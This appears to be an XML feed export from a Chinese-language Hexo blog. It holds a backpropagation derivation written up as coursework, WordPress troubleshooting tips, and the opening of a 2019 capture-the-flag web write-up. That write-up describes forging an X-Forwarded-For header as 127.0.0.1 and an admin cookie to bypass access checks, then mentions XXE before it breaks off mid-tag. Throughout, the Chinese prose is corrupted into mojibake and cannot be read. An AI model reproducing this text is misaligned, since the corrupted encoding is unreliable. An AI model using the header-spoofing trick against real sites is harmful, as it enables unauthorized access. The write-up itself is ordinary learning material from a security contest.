      <link href="2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/"/>
      <url>2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="è€å¸ˆå¸ƒç½®çš„ä½œä¸š"><a href="#è€å¸ˆå¸ƒç½®çš„ä½œä¸š" class="headerlink" title="è€å¸ˆå¸ƒç½®çš„ä½œä¸š"></a>è€å¸ˆå¸ƒç½®çš„ä½œä¸š</h3><ol><li>æè¿° BP ç¥ç»ç½‘ç»œï¼ˆBPNNï¼‰çš„è®­ç»ƒè¿‡ç¨‹ï¼Œæ¨å¯¼ 3 å±‚ BPNN è°ƒæ•´ç½‘ç»œæƒé‡å’Œåç½®é‡çš„å…¬å¼ã€‚ </li></ol><h4 id="è¿™å…¬å¼æ¨å¯¼æœ‰ç‚¹éš¾åº¦â€¦"><a href="#è¿™å…¬å¼æ¨å¯¼æœ‰ç‚¹éš¾åº¦â€¦" class="headerlink" title="è¿™å…¬å¼æ¨å¯¼æœ‰ç‚¹éš¾åº¦â€¦ :("></a>è¿™å…¬å¼æ¨å¯¼æœ‰ç‚¹éš¾åº¦â€¦ :(</h4><p>ç„¶åç½‘ä¸ŠæŸ¥äº†è®¸å¤šèµ„æ–™ï¼Œæœ‰ä¸¤ä¸ªæ”¶è·:</p><ul><li>ç¥ç»ç½‘ç»œåœ¨éšè—å±‚åšäº†ä»€ä¹ˆ</li><li>æŠŠå¤©å¤©å¬é—»çš„çº¿æ€§ä»£æ•°å¯¹ç¥ç»ç½‘ç»œé‡è¦æ€§è”ç³»åœ¨ä¸€èµ·</li></ul><p>éšè—å±‚ï¼šè¯¥å±‚å¯ä»¥è¯´æ˜¯ç¥ç»ç½‘ç»œçš„å…³é”®ï¼Œç›¸å½“äºå¯¹æ•°æ®åšä¸€æ¬¡ç‰¹å¾æå–ã€‚éšè—å±‚çš„æ„ä¹‰ï¼Œæ˜¯æŠŠå‰ä¸€å±‚çš„å‘é‡å˜æˆæ–°çš„å‘é‡ã€‚å°±æ˜¯åæ ‡å˜æ¢ï¼Œè¯´äººè¯å°±æ˜¯æŠŠæ•°æ®åšå¹³ç§»ï¼Œæ—‹è½¬ï¼Œä¼¸ç¼©ï¼Œæ‰­æ›²ï¼Œè®©æ•°æ®å˜å¾—çº¿æ€§å¯åˆ†ã€‚å¯èƒ½è¿™ä¸ªä¸é‚£ä¹ˆå¥½ç†è§£ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><p>ä¸‹é¢çš„å›¾å·¦ä¾§æ˜¯åŸå§‹æ•°æ®ï¼Œè¦æŠŠç»¿ç‚¹å’Œçº¢ç‚¹åˆ†å‰²å¼€ï¼Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ</p><center class="half">    <img src="/img/neutral/1.png" class="lazyload" data-srcset="/img/neutral/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 10% 3% 0%;">    <img src="/img/neutral/2.png" class="lazyload" data-srcset="/img/neutral/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 0% 3% 0%;"></center><p>ä¸Šé¢äºŒå›¾å¯ä»¥<a href="https://cs.stanford.edu/people/karpathy/convnetjs//demo/classify2d.html">åœ¨è¿™ç©</a></p><p>ä¸€ç§åšæ³•ï¼šæŠŠå·¦å›¾çš„å¹³é¢çœ‹æˆä¸€å—å¸ƒï¼ŒæŠŠå®ƒç¼åˆæˆä¸€ä¸ªé—­åˆçš„åŒ…åŒ…ï¼ˆç›¸å½“äºæ•°æ®å˜æ¢åˆ°äº†ä¸€ä¸ª3ç»´åæ ‡ç©ºé—´ï¼‰ï¼Œç„¶åæŠŠæœ‰ç»¿è‰²ç‚¹çš„éƒ¨åˆ†æ’¸åˆ°é¡¶éƒ¨ï¼ˆä¼¸ç¼©å’Œæ‰­æ›²ï¼‰ï¼Œç„¶åå¤–å›´çš„çº¢è‰²ç‚¹è‡ªç„¶åœ¨å¦ä¸€ç«¯äº†ï¼Œè¦æ˜¯å§¿åŠ¿è¿˜ä¸å¤Ÿå¸…ï¼Œå°±æŒªæŒªä½ç½®ï¼ˆå¹³ç§»ï¼‰ã€‚è¿™æ—¶å€™å¹²è„†åˆ©è½çš„ç ä¸€åˆ€ï¼Œç»¿ç‚¹çº¢ç‚¹å°±å½»åº•åŒºåˆ†å¼€äº†ã€‚</p><p>è®ºçº¿æ€§ä»£æ•°çš„é‡è¦æ€§ï¼Œè”ç³»ä¸èµ·æ¥å¯æ¥è¿™é‡Œè¡¥è¯¾<a href="https://www.bilibili.com/video/av6731067">bç«™çº¿æ€§ä»£æ•°çš„æœ¬è´¨</a></p><ul><li><p>å…³äºçº¿æ€§å˜æ¢åˆ°3ç»´ç©ºé—´<br>  ä¸åŒç»´åº¦çš„å˜æ¢æ˜¯åˆç†çš„</p><p>  ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªçŸ©é˜µï¼Œå®ƒçš„å‡ ä½•æ„ä¹‰å°±æ˜¯å°†äºŒç»´ç©ºé—´æ˜ å°„åˆ°ä¸‰ç»´ç©ºé—´ä¸Š<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1\<br>  4 &amp; 1\<br>  5 &amp; 9<br>  \end{bmatrix}<br>  $$</p><p>  å› ä¸ºçŸ©é˜µæœ‰ä¸¤åˆ—è¡¨é¢è¾“å…¥ç©ºé—´æœ‰ä¸¤ä¸ªåŸºå‘é‡ï¼Œ<br>  æœ‰ä¸‰è¡Œè¡¨ç¤ºæ¯ä¸€ä¸ªåŸºå‘é‡åœ¨å˜æ¢åéƒ½ç”¨ä¸‰ä¸ªç‹¬ç«‹çš„åæ ‡æ¥æè¿°<br>  æ‰€ä»¥å®ƒä»¬ä¸€å®šè½åœ¨ä¸‰ç»´ç©ºé—´ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªä»äºŒç»´ç©ºé—´åˆ°ä¸‰ç»´ç©ºé—´çš„å˜æ¢</p><p>  ä¸å¤ªç†è§£å¯ä»¥çœ‹æ­¤è§†é¢‘ <a href="https://www.bilibili.com/video/av6731067/?p=4">bç«™çº¿æ€§ä»£æ•°çš„æœ¬è´¨-ç¬¬å››ç« </a></p><p>  å†å¦‚ä¸‹é¢è¿™ä¸ªçŸ©é˜µ<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1 &amp; 4\<br>  1 &amp; 5 &amp; 9<br>  \end{bmatrix}<br>  $$<br>  çŸ©é˜µä¸‰åˆ—è¡¨ç¤ºåŸå§‹ç©ºé—´æœ‰ä¸‰ä¸ªåŸºå‘é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åŸå§‹ç©ºé—´æ˜¯ä¸‰ç»´<br>  æœ‰ä¸¤è¡Œè¡¨æ˜è¿™ä¸‰ä¸ªåŸºå‘é‡åœ¨å˜æ¢åéƒ½ä»…ç”¨ä¸¤ä¸ªåæ ‡æ¥æè¿°<br>  æ‰€ä»¥å®ƒä»¬ä¸€å®šè½åœ¨äºŒç»´ç©ºé—´ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªä»ä¸‰ç»´ç©ºé—´åˆ°äºŒç»´ç©ºé—´çš„å˜æ¢</p></li></ul><h4 id="ä¸€ä¸ªäºŒç»´å‘é‡è¾“å…¥åˆ°ä¸‰ç»´å‘é‡è¾“å‡º"><a href="#ä¸€ä¸ªäºŒç»´å‘é‡è¾“å…¥åˆ°ä¸‰ç»´å‘é‡è¾“å‡º" class="headerlink" title="ä¸€ä¸ªäºŒç»´å‘é‡è¾“å…¥åˆ°ä¸‰ç»´å‘é‡è¾“å‡º:"></a>ä¸€ä¸ªäºŒç»´å‘é‡è¾“å…¥åˆ°ä¸‰ç»´å‘é‡è¾“å‡º:</h4><p>$$<br>\begin{bmatrix}<br>3\<br>1<br>\end{bmatrix}\rightarrow L\left ( \vec{\nu}  \right ) \rightarrow  \begin{bmatrix}<br>1\<br>8\<br>2<br>\end{bmatrix}<br>$$</p><p>å›æƒ³çº¿æ€§ä»£æ•°ï¼Œ$ L\left ( \vec{\nu}  \right ) $ æ˜¯ä¸€ä¸ª3è¡Œ2åˆ—çš„çŸ©é˜µ<br>åˆ™ $ L\left ( \vec{\nu}  \right ) $ ä¹˜ä»¥2è¡Œ1åˆ—(3,1)çš„çŸ©é˜µå°±æ˜¯ä»¥å®ƒä¸ºåŸºå‘é‡ä½œåŸºå˜æ¢<br>å¾—åˆ°çš„ç»“æœå°±æ˜¯å‡ç»´åˆ°ä¸‰ç»´ç©ºé—´åçš„å‘é‡</p><h3 id="å¹å®Œæ°´äº†ï¼Œå¼€å§‹æ¨å¯¼å…¬å¼â€¦"><a href="#å¹å®Œæ°´äº†ï¼Œå¼€å§‹æ¨å¯¼å…¬å¼â€¦" class="headerlink" title="# å¹å®Œæ°´äº†ï¼Œå¼€å§‹æ¨å¯¼å…¬å¼â€¦"></a># å¹å®Œæ°´äº†ï¼Œå¼€å§‹æ¨å¯¼å…¬å¼â€¦</h3><p><a href="https://www.jianshu.com/p/68e6f82d88b7">hexo æ”¯æŒLaTexå‚è€ƒé“¾æ¥</a></p><ul><li>ä¸‰å±‚ BPNN è°ƒæ•´ç½‘ç»œæƒé‡å’Œåç½®é‡çš„å…¬å¼åˆ†åˆ«ä¸º<br>$$ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} = \omega_{ij} + (\eta)O_{i}E_{j} \qquad (1) $$<br>$$ b_{j}=b_{j} + \Delta b_{j} = b_{j} + (\eta)E_{j} \qquad\quad\quad (2) $$<br>  å…¶ä¸­ï¼š<ul><li>$\omega_{ij}$ è¡¨ç¤ºè¾“å…¥å±‚åˆ°éšå«å±‚çš„æƒé‡ï¼Œ$\eta$ è¡¨ç¤ºå­¦ä¹ ç‡</li><li>$O_{i}$ è¡¨ç¤ºä¸Šä¸€å±‚å•å…ƒiçš„è¾“å‡ºï¼Œ$E_{j}$ è¡¨ç¤ºjå±‚ç¥ç»å…ƒè¯¯å·®</li><li>$b_{j}$ è¡¨ç¤ºjå•å…ƒåç½®é‡(è‡³äºä¸ºä»€ä¹ˆå–åä¸ºbï¼Œä¸‹é¢æœ‰æåˆ°)</li></ul></li></ul><h5 id="ç°éœ€è¦æ¨å¯¼-1-2-å¼å­ç­‰å·æˆç«‹"><a href="#ç°éœ€è¦æ¨å¯¼-1-2-å¼å­ç­‰å·æˆç«‹" class="headerlink" title="ç°éœ€è¦æ¨å¯¼(1)(2)å¼å­ç­‰å·æˆç«‹"></a>ç°éœ€è¦æ¨å¯¼(1)(2)å¼å­ç­‰å·æˆç«‹</h5><ul><li>å…ˆå–æ¿€æ´»å‡½æ•°<br>$$<br>f(x)=\frac{1}{1+e^{-x}}<br>$$</li></ul><p><img src="/img/neutral/4.png" class="lazyload" data-srcset="/img/neutral/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nstructure"></p><ul><li><p>ç”±ä¸Šå›¾é™¤äº†è¾“å…¥å±‚çš„ç¥ç»å…ƒï¼Œæ¯ä¸ªç¥ç»å…ƒéƒ½ä¼šæœ‰åŠ æƒæ±‚å’Œå¾—åˆ°çš„è¾“å…¥å€¼ z å’Œå°† z é€šè¿‡ Sigmoid å‡½æ•°ï¼ˆä¹Ÿå³æ˜¯æ¿€æ´»å‡½æ•°ï¼‰éçº¿æ€§è½¬åŒ–åçš„è¾“å‡ºå€¼ aï¼Œä»–ä»¬ä¹‹é—´çš„è®¡ç®—å…¬å¼å¦‚ä¸‹<br>$$<br>z_{i}^{j}=\sum_{i=1â€¦n}w_{ij}\cdot a_{ij}^{l-1}-b_{j}^{l} \qquad (3)\<br>a_{j}^{l}=f(z_{j}^{(l)})=\frac{1}{1+e^{-z_{j}^{(l)}}} \quad (4)<br>$$</p><p>  å¼å­(3)ï¼Œæ˜¯ä¸æ˜¯å’Œ y = kx + bç±»ä¼¼ï¼Ÿ å…¶å®bå¯ä»¥ç†è§£ä¸ºçº¿æ€§åå·® (è¿™ä¹Ÿæ˜¯å–bä¸ºåçš„åŸå› ï¼Œæ–¹ä¾¿ç†è§£)</p><p>  ç„¶åä»£å…¥åˆ°Sigmoid å‡½æ•°ä¸­åšéçº¿æ€§å˜æ¢ï¼Œåšè¿™ä¸ªå˜æ¢ä¸»è¦æ˜¯å› ä¸ºçº¿æ€§æ¨¡å‹çš„è¡¨è¾¾èƒ½åŠ›ä¸å¤Ÿ(<a href="https://www.zhihu.com/question/22334626">è¯¦æƒ…è¯·æˆ³æˆ‘</a>)ï¼Œå…¶å®è¿™ä¸ªéçº¿æ€§å˜æ¢ä¹Ÿæœ‰å®ƒçš„ç¼ºç‚¹ï¼Œæ¯”å¦‚ <a href="https://blog.csdn.net/NOT_GUY/article/details/78749509">æ¢¯åº¦æ¶ˆå¤±ã€ä¸æ˜¯0å‡å€¼ã€ä¸æ˜¯0å‡å€¼</a></p></li><li><p>å› ä¸ºè¾“å‡ºå±‚çš„å€¼ä¸çœŸå®çš„å€¼ä¼šå­˜åœ¨è¯¯å·®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‡æ–¹è¯¯å·®æ¥è¡¡é‡é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„è¯¯å·®ã€‚<br>$$<br>E=\frac{1}{2}\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \qquad (5)<br>$$</p><p>  å…¶ä¸­ $Y_{j}^{k}$ è¡¨ç¤ºæœŸæœ›è¾“å‡ºï¼Œæ˜¯å·²çŸ¥é‡</p><p>  è¯¯å·®è‚¯å®šæ˜¯è¶Šå°è¶Šå¥½ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°±è¦è°ƒæ•´wå’Œbå€¼ï¼Œ ä½¿å¾—è¯¯å·®å‡½æ•°çš„å€¼æœ€å°ã€‚<br>  è¦æ±‚å¼å­(5) åœ¨ä¸¤ä¸ªå˜é‡ ( $\omega$ å’Œ $b$ ) å–ä¸åŒå€¼æ—¶çš„æœ€å€¼ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯æ±‚å„è‡ªçš„åå¯¼äº†</p></li></ul><ul><li><p>å¼•å…¥å¼å­(1) å’Œ (4) å¯¹ç›®æ ‡å‡½æ•° E æ±‚ $\omega$ å’Œ $b$ çš„åå¯¼å¯ä»¥å¾—åˆ° $\omega$ å’Œ $b$ çš„æ›´æ–°é‡<br>  ä¸‹é¢æ‹¿æ±‚ $\omega$ åå¯¼æ¥åšæ¨å¯¼ã€‚<br>$$<br>\Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} \qquad (6)<br>$$<br>  $\eta$ å­¦ä¹ ç‡å–å€¼é€šå¸¸ä¸º 0.1 ~ 0.3,å¯ä»¥ç†è§£ä¸ºæ¯æ¬¡æ¢¯åº¦æ‰€è¿ˆçš„æ­¥ä¼ã€‚<br>  $w_{hj}$ä¸º h å’Œ j ä¸¤å±‚ç¥ç»å…ƒä¹‹é—´çš„æƒé‡<br>  æ³¨æ„åˆ° $w_{hj}$ çš„å€¼å…ˆå½±å“åˆ°ç¬¬ j ä¸ªè¾“å‡ºå±‚ç¥ç»å…ƒçš„è¾“å…¥å€¼ aï¼Œå†å½±å“åˆ°è¾“å‡ºå€¼ y</p><p>  æ ¹æ®é“¾å¼æ±‚å¯¼æ³•å¯¹æƒé‡æ±‚åå¯¼æœ‰ï¼š<br>$$<br>\frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} \qquad (7)<br>$$</p><p>  ç”± (3) æœ‰:<br>$$<br>\frac{\partial z_{j}^{l}}{\partial w_{hj}}  = {(\sum_{i=1â€¦n}w_{hj}\cdot a_{hj}^{l-1}-b_{j}^{l})}â€™ = a_{hj}^{l-1} = O_{i} \qquad (8)<br>$$<br>  ä¸ç¥ç»ç½‘ç»œç»“æ„å›¾å¯¹åº”çŸ¥ $ a_{hj}^{l-1} $ ä¸ºä¸Šä¸€å±‚å•å…ƒiçš„è¾“å‡º $ O_{i} $</p></li><li><p>Sigmoid æ±‚å¯¼çš„å¼å­å¦‚ä¸‹ï¼Œ<a href="https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_jpg/ptp8P184xjzr3IibYwltdavich3yf8sbJHO8nFQQiaPX49zKcGg7j8ImL1PW3zZYIy8pQJxXNU3qhwDTeEnx79d5A/640?wx_fmt=jpeg">æ±‚å¯¼è¿‡ç¨‹è¯·æˆ³æˆ‘</a><br>$$<br>f{}â€™(x) = f(x)(1-f(x)) \qquad (9)<br>$$<br>ç”± (5) å’Œ (9) æœ‰ï¼š<br>$$<br>\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = -\frac{1}{2}\cdot 2\cdot (Y_{j}^{k}-a_{j}^{i})\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}=a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) =     E_{j} \qquad (10)<br>$$</p></li><li><p>å†çœ‹çœ‹å¼å­ (1) å’Œ (2) ä¸­çš„ $E_{j}$ï¼Œè¯¾æœ¬ç»™å‡º å…³äº $ E_{j} $çš„å…¬å¼:<br>$$<br>E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\sum_{k}w_{jk}E_{k}  \qquad (11)<br>$$</p><ul><li>å…¶ä¸­ $ T_{j} $ æ˜¯è¾“å‡ºå•å…ƒ $j$ çš„é¢„æœŸæ˜¯è¾“å‡ºï¼Œ å³å¼å­ (10) ä¸­çš„ $ Y_{j}^{k} $ </li><li>$ E_{k} $ è¡¨ç¤ºå®ƒè¿æ¥çš„åé¢ä¸€å±‚çš„å•å…ƒ $k$ çš„è¯¯å·®, ç”±æ­¤çœ‹å¼å­ (11) å…¶å®è¿˜æŒºå®¹æ˜“ç†è§£çš„ï¼š<br>$ O_{j}(1-O_{j}) $ è¡¨ç¤º sigmodå‡½æ•°çš„åå¯¼ï¼Œå³è¡¨ç¤ºè°ƒæ•´è¯¯å·®çš„é€Ÿåº¦<br>å³ j å±‚ç¥ç»å…ƒè¯¯å·®æ˜¯é€šè¿‡é¢„æœŸè¾“å‡ºä¸å®é™…è¾“å‡ºçš„å·®å€¼å’Œè°ƒæ•´è¯¯å·®é€Ÿåº¦æ¥è·å–çš„</li></ul></li></ul><h4 id="æ¿€åŠ¨äººå¿ƒçš„æ—¶å€™åˆ°å•¦"><a href="#æ¿€åŠ¨äººå¿ƒçš„æ—¶å€™åˆ°å•¦" class="headerlink" title="æ¿€åŠ¨äººå¿ƒçš„æ—¶å€™åˆ°å•¦!!"></a>æ¿€åŠ¨äººå¿ƒçš„æ—¶å€™åˆ°å•¦!!</h4><ul><li>å¼å­ (1)ä¸º: $ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} $</li><li>å¼å­ (6)ä¸º: $ \Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} $</li><li>å¼å­ (7)ä¸º: $ \frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} $</li><li>å¼å­ (8) å’Œ (10) åˆ†åˆ«ä¸º: $ \frac{\partial z_{j}^{l}}{\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \qquad $  $ \frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $</li><li>å³: $ \Delta \omega_{ij} = (\eta)O_{i}E_{j} $</li></ul><h4 id="ç±»ä¼¼ä¹Ÿå¯ä»¥è¯å¾—åç½®é‡å…¬å¼-b-j-eta-E-j"><a href="#ç±»ä¼¼ä¹Ÿå¯ä»¥è¯å¾—åç½®é‡å…¬å¼-b-j-eta-E-j" class="headerlink" title="ç±»ä¼¼ä¹Ÿå¯ä»¥è¯å¾—åç½®é‡å…¬å¼ $ b_{j} = -(\eta)E_{j} $"></a>ç±»ä¼¼ä¹Ÿå¯ä»¥è¯å¾—åç½®é‡å…¬å¼ $ b_{j} = -(\eta)E_{j} $</h4><h4 id="å¿ƒç´¯-ä¸è¿‡æ¨å¯¼å®Œåï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„ï¼Œ23333"><a href="#å¿ƒç´¯-ä¸è¿‡æ¨å¯¼å®Œåï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„ï¼Œ23333" class="headerlink" title="å¿ƒç´¯,,,ä¸è¿‡æ¨å¯¼å®Œåï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„ï¼Œ23333"></a>å¿ƒç´¯,,,ä¸è¿‡æ¨å¯¼å®Œåï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©çš„ï¼Œ23333</h4><br><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: zhiyong_will</a><br><a href="https://github.com/edvardHua/Articles/tree/master/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%20BP%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%20Python%20%E5%AE%9E%E7%8E%B0%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90">github: edvardHua</a><br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: csdnäººå·¥æ™ºèƒ½å¤´æ¡</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦æ ¡è¯¾ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦æ ¡è¯¾ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress å¸¸è§é—®é¢˜æ±‡æ€»</title>
      <link href="2019/09/23/wordpress_problem/"/>
      <url>2019/09/23/wordpress_problem/</url>
      
        <content type="html"><![CDATA[<h3 id="wordpresså‡çº§ååå°è®¿é—®ä¸äº†"><a href="#wordpresså‡çº§ååå°è®¿é—®ä¸äº†" class="headerlink" title="wordpresså‡çº§ååå°è®¿é—®ä¸äº†"></a>wordpresså‡çº§ååå°è®¿é—®ä¸äº†</h3><p>Cannot Modify Header Information â€“ Headers Already Sent Byâ€¦â€¦.</p><ul><li>è§£å†³åŠæ³•ä¸€ï¼šåœ¨ä¸»é¢˜ç›®å½•ä¸‹functions.phpå¼€å¤´åŠ å…¥ob_start()ï¼›</li><li>è§£å†³åŠæ³•äºŒï¼šæ‰¾åˆ°sent byåé¢çš„.phpæ–‡ä»¶ï¼Œä¿å­˜ä¸ºUTF-8æ— BOMç¼–ç æ ¼å¼;<br>  vim çš„è¯ï¼Œå‘½ä»¤æ¨¡å¼è¾“å…¥ :set nobomb å³å¯è½¬æ¢ä¸ºUTF-8æ— BOMç¼–ç æ ¼å¼</li></ul><h3 id="wordpress-åå°åª’ä½“åº“ä¸æ˜¾ç¤ºä»¥åŠä¸Šä¼ é”™è¯¯"><a href="#wordpress-åå°åª’ä½“åº“ä¸æ˜¾ç¤ºä»¥åŠä¸Šä¼ é”™è¯¯" class="headerlink" title="wordpress åå°åª’ä½“åº“ä¸æ˜¾ç¤ºä»¥åŠä¸Šä¼ é”™è¯¯"></a>wordpress åå°åª’ä½“åº“ä¸æ˜¾ç¤ºä»¥åŠä¸Šä¼ é”™è¯¯</h3><p>åœ¨&lt;!DOCTYPE&gt; å£°æ˜ä¹‹å‰æœ‰å…¶ä»–çš„ä»£ç <br>å¯¼è‡´æµè§ˆå™¨ä¸èƒ½æ­£ç¡®è¯†åˆ«é¡µé¢çš„æ ‡å‡†ï¼Œæ‰€ä»¥æ‰é€ æˆäº†æŸäº›åŸºäºhtml5çš„ç‰¹æ€§ä¸èƒ½ä½¿ç”¨ã€‚</p><p>å‚è€ƒé“¾æ¥ <a href="https://www.zmki.cn/1428.html">https://www.zmki.cn/1428.html</a></p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019å¹´ç¬¬ä¸‰å±Šå¹¿ä¸œçœå¼ºç½‘æ¯ç½‘ç»œå®‰å…¨å¤§èµ›WEBwriteup</title>
      <link href="2019/09/10/2019qwb/"/>
      <url>2019/09/10/2019qwb/</url>
      
        <content type="html"><![CDATA[<h3 id="å…«å¦"><a href="#å…«å¦" class="headerlink" title="å…«å¦"></a>å…«å¦</h3><p>æœ¬æ¬¡æ¯”èµ›çš„ä¸€ä¸ªæ§½ç‚¹ï¼Œ<br>ä¸ºä»€ä¹ˆæ˜¯åœ¨æ˜ŸæœŸä¸€äºŒä¸¾è¡Œå’§â€¦</p><p>ç”±äºæˆ‘åªä¼šä¸€ç‚¹ web ï¼Œæ‰€ä»¥åªè§£å‡ºå‡ é“ web é¢˜</p><p>Writeby TARITARI</p><h3 id="1-Web-â€“-å°æ˜åˆè¢«æ‹’ç»äº†"><a href="#1-Web-â€“-å°æ˜åˆè¢«æ‹’ç»äº†" class="headerlink" title="1. Web â€“ å°æ˜åˆè¢«æ‹’ç»äº†"></a>1. Web â€“ å°æ˜åˆè¢«æ‹’ç»äº†</h3><p>çœ‹åˆ°é¢˜ç›®å¾ˆå®¹æ˜“æƒ³åˆ°æ”¹httpå¤´ï¼Œäºæ˜¯æŠ“åŒ…ã€‚ä¸€å¼€å§‹ç›´æ¥æ”¹cookie: admin=1æ— æ•ˆï¼Œåæ¥æƒ³äº†ä¸‹ï¼Œå°æ˜å¦‚æœæ˜¯æœ¬åœ°äººå°±ä¸ä¼šè¢«æ‹’ç»å•¦ï¼äºæ˜¯ç”¨åˆ°X-Forwarded-Forå­—æ®µï¼Œä¼ªé€ ipä¸ºæœ¬åœ°åœ°å€127.0.0.1ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>æäº¤è¿‡å»å‘ç°ä¸æ˜¯adminï¼Œæ”¹å¥½cookieåå³å¯è·å¾—flag{xxasdasdd_for}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="2-Web-â€“-XXï¼Ÿ"><a href="#2-Web-â€“-XXï¼Ÿ" class="headerlink" title="2. Web â€“ XXï¼Ÿ"></a>2. Web â€“ XXï¼Ÿ</h3><p>çœ‹åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†xxeï¼Œå…ˆè®¿é—®ç½‘ç«™å‘ç°ç½‘ç«™çš„æ ‡é¢˜ä¸ºgedit</p><p><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" 